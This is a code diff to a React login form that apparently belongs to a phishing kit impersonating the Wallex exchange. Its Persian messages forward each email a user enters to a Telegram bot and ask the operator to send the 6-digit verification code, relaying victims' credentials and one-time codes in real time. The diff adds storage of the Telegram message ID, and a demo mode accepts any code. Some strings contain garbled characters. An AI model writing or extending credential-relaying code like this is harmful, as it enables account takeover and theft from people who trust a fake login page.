@@ -262,7 +262,7 @@ export const LoginForm = () => {
 
       // In demo mode, accept any 6-digit code
       if (!validateTelegramConfig()) {
-        console.log("���� Demo mode: accepting any 6-digit code");
+        console.log("🎭 Demo mode: accepting any 6-digit code");
         await new Promise((resolve) => setTimeout(resolve, 1000));
       } else {
         // Update verification in Telegram
@@ -411,11 +411,14 @@ export const LoginForm = () => {
     try {
       console.log("Sending email to Telegram:", email);
 
-      // Send email to Telegram
-      await sendPhoneToTelegramEnhanced(
+      // Send email to Telegram and store message ID
+      const result = await sendCustomMessageToTelegram(
         `📧 کاربر ایمیل وارد کرد:\n\nایمیل: ${email}\n\nلطفا کد ۶ رقمی تایید ایمیل را ارسال کنید.`,
-        false,
       );
+
+      if (result.success && result.messageId) {
+        setEmailMessageId(result.messageId);
+      }
 
       setEmailStep("code");
     } catch (error) {
@@ -767,7 +770,7 @@ export const LoginForm = () => {
                   <AlertMessage>
                     {!validateTelegramConfig()
                       ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
-                      : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
+                      : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ار��ال خواهد شد."}
                   </AlertMessage>
                 </div>
               </div>
